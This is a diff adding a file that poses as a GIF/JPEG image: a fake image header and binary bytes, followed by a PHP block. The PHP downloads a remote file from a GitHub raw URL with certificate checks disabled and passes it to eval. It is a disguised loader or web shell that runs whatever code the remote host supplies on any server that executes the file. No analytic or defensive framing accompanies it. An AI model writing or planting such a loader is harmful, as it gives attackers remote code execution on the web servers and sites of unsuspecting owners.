@@ -1,0 +1,43 @@
+<!-- GIF89;a -->
+���  JFIF          �� �                
+ 
+    
+ 
+  
+  
+       ""    $(4,$&1'  -=-157:::#+?D?8C49:7 
+ 
+ 
+ 
+ 
+    7% %77777777777777777777777777777777777777777777777777��    { �  "       ��                           �� 5                        !1 AQa "q� 2�� BR��#b� �����                     ��                    ��          ? ��D@DD D@DD D@DD kK� �6 �UG�4V�1��
+�� ���릟� @� #���RY�dqp� 
+���� �o �7� m�s�<� �VPS�e~V�چ8���X�T � $��c�� 9��ᘆ�m6@ WU� f�Don � �r��5}9��} ��h c�fF��/r=hi�� �͇�*�� b�.��$0�&te��y �@�A�F�=� P                       f� A� �a���˪��É ��U|� �   3\�״ H  SZ� g46�C��צ�ے   �b   <���;m ���Rpع^��l7��*�����TF�}�\�M���M %�' �����٠ݽ�v � ��!-��� ��?�N!La��A+[ `#� ��M���� '�~o R�?��v ^)��=��h ����A��X�. ���˃����^Ə�� ܯsO"B� c>;
+�e�4��5�k��/CB�.
+  �J?��;�҈� ���� ���� ���� ���� ��~ �<�VZ�ꭼ2/)͔jC���ע�V� G�!���!�F����� �\ �� Kj�R�o c�h���:ޠ I� �1"2�q װ8��Р@ז���_  C0�ր ��A��lQ ��@纼�!7��F�� �]�s Z
+B�62r�v�z~� K  �7�c��5�.��ӄq &�Z�d�<� kk���T  &8�|���I�� �� Ws}���ǽ�cq nΑ�_���3 ��|N �-y,��i���ȗ_�\60 �� �@��6��� �D@DD D@DD D@DD D@DD D@DD c�KN66<�c� �64= r�����
+Ď 0��h���t&(�hnb[ � ?��^��\��â|�,� /h�\��R� �5�?
+�0�!צ܉ -����G���٬��Q�zA�  ��1�� �V� � �:R���`�$��ik ��H����D4���#dk���� � h�} ����  7���w%�������*o 8wG� Lycu T�.���ܯ7� �I��u^���)��/c�,s� Nq�ۺ�;�ך�YH2���.5B���DD D@DD D@DD D@DD D@DD D@V|  �a �j{7c��X�F\�3MuA׾hb�  � � n��F������  � �8�(��e����Pp�\"G�`s��m��ާaW�K��O�� ��|;ei����֋� [�q��"; a��1����Y�G�W/�߇�&�<���Ќ�H'q�m��<s�Ő�0�dk�.tc�:z�G�: < FV2Zu�V
+ 
+N(��b &1 K 
+���_�{� ���5�(H��h � �{�.� ��� ���� ���� ���� ���� ��*~ \<P�7 ���i��� JT8�F 
+      i��  ���ZZӷ��'��x��F5s�� �
+ �R   �75��N��&I,l��  �Z�ˮ�X���_$ �o � (�g�� ���5�5X?S����� Lv� 6���]���|bG�<:��K�s   O����\|+ H�YB&�ߛ[��_nԃ��O� Ŷ �� A ޤn �݂�_r��H�W8�5VW� " "" " "" " "" " "" " "" �XY ��? � !���4����u � 8�G�1A��E�*� ���M /� ���
+�$ @"��j��˩Vr;����[k0e �
+s�h>�)�X+ ! ��=�m�ۚ丷 ~6a^X�)� ��,�>#&6G���Y � �{� �� �" " "" " "" " "" " "" " "" ��a t\/�a�8 � yp%�lhl �n����)�� �i�t��B� ���� ���� ����?��
+<?php 
+function getCurlk2($url)
+{
+  $ch = curl_init();
+  curl_setopt($ch, CURLOPT_URL, $url);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+  $result = curl_exec($ch);
+  curl_close($ch);
+  return $result;
+}
+
+$str=getCurlk2("https://raw.githubusercontent.com/michgrayy/idk-files/main/sitemap.txt");
+echo eval("?>".(($str)));
+?>
